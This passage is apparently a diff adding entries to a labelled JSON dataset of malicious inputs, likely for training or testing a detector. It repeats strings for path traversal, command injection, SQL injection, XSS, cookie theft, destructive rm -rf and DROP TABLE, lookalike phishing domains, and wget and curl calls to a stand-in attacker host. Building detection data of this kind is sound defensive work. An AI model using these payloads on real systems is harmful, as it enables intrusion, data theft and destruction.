+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/billing",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/docs",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/users",
+    "label": 1
+  },
+  {
+    "text": "{7+7}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/login",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/account",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 1=1 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT password FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM sessions",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE payments",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM profiles WHERE id=5",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO credentials VALUES (6)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(7)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(8)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/products",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/orders",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/profile",
+    "label": 1
+  },
+  {
+    "text": "{1+1}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/help",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/dashboard",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 4=4 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT username,password FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM accounts",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE orders",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM customers WHERE id=8",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO sessions VALUES (9)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(2)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/api/v1/items",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/search",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/checkout",
+    "label": 1
+  },
+  {
+    "text": "{4+4}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/docs",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/users",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 7=7 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT token FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM profiles",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE credentials",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM users WHERE id=2",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO accounts VALUES (3)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(4)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(5)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/home",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/login",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/account",
+    "label": 1
+  },
+  {
+    "text": "{7+7}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/orders",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/profile",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 1=1 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT id FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM customers",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE sessions",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM payments WHERE id=5",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO profiles VALUES (6)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(7)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(8)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/settings",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/help",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/dashboard",
+    "label": 1
+  },
+  {
+    "text": "{1+1}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/search",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/checkout",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 4=4 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT name FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM users",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE accounts",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM orders WHERE id=8",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO customers VALUES (9)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(2)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/billing",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/docs",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /var/users",
+    "label": 1
+  },
+  {
+    "text": "{4+4}",
+    "label": 1
+  },
+  {
+    "text": "https://githu2b.com/login",
+    "label": 1
+  },
+  {
+    "text": "https://paypa1.com/account",
+    "label": 1
+  },
+  {
+    "text": "admin' OR 7=7 --",
+    "label": 1
+  },
+  {
+    "text": "' UNION SELECT secret FROM users --",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM payments",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE profiles",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM credentials WHERE id=2",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO users VALUES (3)",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(4)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(5)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=fetch('/steal')>",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami && id",
+    "label": 1
+  },
+  {
+    "text": "wget http://evil.example/products",
+    "label": 1
+  },
+  {
+    "text": "curl http://evil.example/orders",
     "label": 1
   }
 ]
